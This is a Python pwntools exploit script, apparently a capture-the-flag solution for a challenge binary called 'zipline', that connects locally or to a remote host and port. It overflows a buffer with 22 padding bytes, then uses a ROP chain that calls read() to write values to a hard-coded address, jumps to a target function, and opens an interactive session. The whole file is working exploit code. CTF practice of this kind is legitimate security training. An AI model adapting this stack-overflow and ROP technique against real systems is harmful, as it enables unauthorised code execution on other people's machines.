#!/usr/bin/env python
# -*- coding:utf-8 -*-
# author: lanzhaoxian
# time: 2019/x/x


from pwn import *
import sys
from time import sleep
from LibcSearcher import *

proc = './zipline'
if len(sys.argv) == 1:
    c = process(proc)
elif len(sys.argv) == 2:
    serverport = sys.argv[1].split(':')
    c = remote(serverport[0], int(serverport[1]))
else:
    c = remote(sys.argv[1], int(sys.argv[2]))
context.binary = proc
elf = ELF(proc)
rop = ROP(proc)
target_addr = 0x0804C041
read_addr = elf.plt['read']
igotu_addr = 0x08049569
c.recvuntil('Ready for a ride on the zipline to hell?\n')
raw_input()
c.sendline(flat(['a'*22, read_addr, igotu_addr, 0, target_addr, 100]))
h = 0xffffffff
c.sendline(flat([h,h,h,h,h,h,h,h,h]))
c.interactive()

